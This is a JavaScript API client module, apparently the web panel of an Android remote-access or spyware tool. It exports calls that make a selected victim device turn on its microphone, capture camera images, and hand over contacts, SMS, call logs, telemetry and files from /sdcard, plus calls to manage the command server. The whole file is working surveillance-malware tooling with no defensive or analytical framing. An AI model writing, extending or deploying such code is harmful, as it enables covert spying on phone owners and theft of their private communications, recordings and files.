import axios from "axios";

const apiClient = axios.create({
  baseURL: import.meta.env.VITE_API_URL || "/api",
  headers: {
    "Content-Type": "application/json",
  },
  timeout: 30000,
});

export const getStatus = () => apiClient.get("/status");
export const getClients = () => apiClient.get("/clients");
export const selectClient = (clientId) => apiClient.post("/clients/select", { client_id: clientId });
export const disconnectClient = (clientId = null) => apiClient.post("/client/disconnect", clientId ? { client_id: clientId } : {});
export const disconnectSpecificClient = (clientId) => apiClient.post("/clients/disconnect", { client_id: clientId });
export const getLogs = () => apiClient.get("/logs");
export const clearLogs = () => apiClient.post("/logs/clear");
export const startServer = () => apiClient.post("/server/start");
export const stopServer = () => apiClient.post("/server/stop");
export const killServer = () => apiClient.post("/server/kill");
export const startMic = (clientId = null) => apiClient.post("/client/mic/start", clientId ? { client_id: clientId } : {});
export const stopMic = (clientId = null) => apiClient.post("/client/mic/stop", clientId ? { client_id: clientId } : {});
export const fetchContacts = (clientId = null) => apiClient.post("/client/contacts", clientId ? { client_id: clientId } : {});
export const getContactsList = () => apiClient.get("/contacts/list");
export const fetchSms = (hours = 24, clientId = null) => apiClient.post("/client/sms", { hours, ...(clientId ? { client_id: clientId } : {}) });
export const getLatestSms = () => apiClient.get("/sms/latest");
export const listCameras = (clientId = null) => apiClient.post("/client/cameras", clientId ? { client_id: clientId } : {});
export const captureCamera = (camId = "0", clientId = null) => apiClient.post("/client/camera/capture", { cam_id: camId, ...(clientId ? { client_id: clientId } : {}) });
export const fetchCallLogs = (hours = 24, clientId = null) => apiClient.post("/client/call_logs", { hours, ...(clientId ? { client_id: clientId } : {}) });
export const getLatestCallLogs = () => apiClient.get("/call_logs/latest");
export const fetchTelemetry = (clientId = null) => apiClient.post("/client/telemetry", clientId ? { client_id: clientId } : {});
export const getTelemetry = () => apiClient.get("/client/telemetry");
export const fetchFiles = (path = "/sdcard", clientId = null) => apiClient.post("/client/files", { path, ...(clientId ? { client_id: clientId } : {}) });
export const getFilesTree = (path = "/sdcard") => apiClient.get("/files/tree", { params: { path } });
export const downloadFile = (path, clientId = null) => apiClient.post("/client/file/download", { path, ...(clientId ? { client_id: clientId } : {}) });
export const getFileDownloadUrl = (path, clientId = null, name = null) => {
  const base = import.meta.env.VITE_API_URL || "/api";
  const params = new URLSearchParams();
  params.append("path", path);
  if (clientId) params.append("client_id", clientId);
  if (name) params.append("name", name);
  return `${base}/file/download?${params.toString()}`;
};
export const clearAllData = () => apiClient.post("/data/clear");

export default apiClient;
